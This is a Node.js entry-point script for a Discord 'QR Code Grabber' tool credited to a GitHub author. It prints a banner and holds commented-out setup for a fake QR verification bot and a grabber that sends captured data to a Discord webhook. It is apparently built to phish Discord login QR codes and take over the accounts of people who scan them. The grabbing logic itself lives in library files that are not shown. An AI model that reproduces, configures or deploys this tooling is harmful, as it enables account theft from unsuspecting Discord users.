// ✌ By https://github.com/zougataga
const
    DuscirdQrVerif = require("./lib/DuscirdQrVerif.js"),
    DiscordQrGrab = require("./lib/DiscordQrGrab.js");
require("colors");

console.log(`
 ██████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗       
██╔═══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝       
██║   ██║██████╔╝██║     ██║   ██║██║  ██║█████╗         
██║▄▄ ██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝         
╚██████╔╝██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗       
 ╚══▀▀═╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝                                                              
 ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
`.blue);
console.log("=> ".cyan + "By https://github.com/zougataga".blue);

// VERIFICATION AVEC ROLES

// new DuscirdQrVerif({
//     bot: {
//         token: "",
//         guild: {
//             id: "",
//             logs: "1084788444057849976",
//             embed: {
//                 verification: "1084585950509793354",
//                 send: false
//             },
//             role: "1084803817142501396"
//         }
//     },
//     keyCaptcha: false
// })

// QR GRABBER

// new DiscordQrGrab({
//     webhook: "https://canary.discord.com/api/webhooks/",
//     keyCaptcha: false,
//     api: {
//         protocole: "http",
//         host: "localhost",
//         port: 80
//     }
// })